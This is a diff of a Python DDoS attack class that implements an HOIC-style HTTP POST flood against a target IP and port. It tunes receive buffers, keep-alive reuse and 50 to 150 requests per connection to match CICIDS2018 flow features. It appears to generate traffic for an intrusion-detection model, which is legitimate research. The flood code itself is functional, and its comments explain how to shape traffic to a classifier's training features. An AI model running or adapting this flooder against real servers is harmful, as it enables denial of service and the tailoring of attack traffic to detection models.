@@ -15,11 +15,11 @@ import time
 import random
 import string
 
-# TCP receive buffer sizes → Init Fwd Win Byts feature.
-# Values derived from CICIDS2018 training data medians.
-# SO_RCVBUF set BEFORE connect() controls TCP SYN window size.
-_RCVBUF_LOIC_HTTP = 8192     # Training: 8192 ✓
-_RCVBUF_HOIC = 49136         # Training median: 49136 (was 32738 — wrong)
+# TCP receive buffer sizes matching CICIDS2018 training data.
+# Setting SO_RCVBUF before connect() controls the TCP SYN window size,
+# which the model uses for classification (Init Fwd Win Byts feature).
+_RCVBUF_LOIC_HTTP = 8192
+_RCVBUF_HOIC = 32738
 
 USER_AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0",
@@ -127,20 +127,12 @@ class DDoSAttack:
                 pass
 
     # ──────────────────────────────────────────────────────
-    # HOIC — HTTP POST flood, NEW connection per 1-2 requests
-    #
-    # CICIDS2018 training data profile:
-    #   Tot Fwd Pkts:    mean=2.5, median=2.5
-    #   TotLen Fwd Pkts: mean=149.4, median=36.5
-    #   Fwd Seg Size Min: 20 (no timestamps in HOIC tool)
-    #   Init Fwd Win Byts: median=49136
-    #   Flow Duration:   very short (~17ms)
-    #   Dst Port: 80
-    #
-    # CRITICAL: Training shows very short connections (2.5 pkts).
+    # HOIC — HTTP POST flood with large payloads ("boosters")
+    #   Creates flows with: high forward bytes, large Fwd Pkt
+    #   Len Mean/Max, high TotLen Fwd Pkts.
     # ──────────────────────────────────────────────────────
     def hoic_flood(self):
-        """HOIC: HTTP POST flood with large payloads, NEW connection per request.
+        """HOIC: HTTP POST flood with large payloads.
         HOIC uses 'boosters' — scripts that generate large POST bodies
         to amplify the bandwidth consumed per request."""
         end_time = time.time() + self.duration
@@ -148,14 +140,12 @@ class DDoSAttack:
         while self.running and time.time() < end_time:
             try:
                 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                sock.settimeout(5)
+                sock.settimeout(10)
                 sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                 sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, _RCVBUF_HOIC)
                 sock.connect((self.target_ip, self.target_port))
 
-                # Send 1-2 POST requests per connection (matching training ~2.5 pkts)
-                requests_this_conn = random.randint(1, 2)
-                for _ in range(requests_this_conn):
+                for _ in range(random.randint(50, 150)):
                     if not self.running or time.time() >= end_time:
                         break
 
@@ -169,7 +159,7 @@ class DDoSAttack:
                         f"Content-Type: application/x-www-form-urlencoded\r\n"
                         f"Content-Length: {len(body)}\r\n"
                         f"Accept: */*\r\n"
-                        f"Connection: close\r\n"
+                        f"Connection: keep-alive\r\n"
                         f"\r\n"
                         f"{body}"
                     )
@@ -178,10 +168,11 @@ class DDoSAttack:
 
                     # Drain response
                     try:
-                        sock.settimeout(0.1)
+                        sock.settimeout(0.01)
                         sock.recv(8192)
                     except socket.timeout:
                         pass
+                    sock.settimeout(10)
 
                 sock.close()
             except Exception:
